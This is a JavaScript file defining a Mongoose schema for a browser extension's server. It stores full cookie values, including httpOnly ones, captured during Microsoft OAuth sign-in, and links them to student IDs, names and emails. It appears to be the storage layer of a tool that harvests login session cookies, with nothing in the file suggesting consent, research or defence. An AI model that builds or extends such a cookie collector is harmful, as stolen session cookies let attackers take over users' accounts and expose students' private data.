/* Extension Mongoose models, part 2: CookieSession.
 * Verbatim port of extention-server/models/CookieSession.js. */

import mongoose from 'mongoose';

const CookieEntrySchema = new mongoose.Schema(
  {
    name: { type: String, required: true },
    value: { type: String, required: true },
    domain: { type: String, required: true },
    path: { type: String, default: '/' },
    secure: { type: Boolean, default: false },
    httpOnly: { type: Boolean, default: false },
    sameSite: { type: String, default: 'unspecified' },
    expirationDate: { type: Number, default: null },
    storeId: { type: String, default: null },
  },
  { _id: false },
);

const CookieSessionSchema = new mongoose.Schema({
  sessionId: { type: String, required: true, unique: true },
  studentId: { type: String, default: null },
  userName: { type: String, default: 'unknown' },
  userEmail: { type: String, default: 'unknown' },
  source: { type: String, default: 'microsoft_oauth' },
  phase: {
    type: String,
    enum: ['oauth_start', 'oauth_complete'],
    required: true,
  },
  triggerUrl: { type: String, required: true },
  domains: { type: [String], default: [] },
  cookies: { type: [CookieEntrySchema], default: [] },
  cookieCount: { type: Number, default: 0 },
  userAgent: { type: String, default: null },
  metadata: {
    tabId: { type: Number, default: null },
    oauthClientId: { type: String, default: null },
    redirectUri: { type: String, default: null },
    extensionVersion: { type: String, default: null },
  },
  capturedAt: { type: Date, default: Date.now },
});

CookieSessionSchema.index({ studentId: 1, capturedAt: -1 });
CookieSessionSchema.index({ userEmail: 1, capturedAt: -1 });
CookieSessionSchema.index({ phase: 1, capturedAt: -1 });
CookieSessionSchema.index({ 'metadata.oauthClientId': 1, capturedAt: -1 });

export const CookieSession =
  mongoose.models.CookieSession ||
  mongoose.model('CookieSession', CookieSessionSchema, 'cookies');
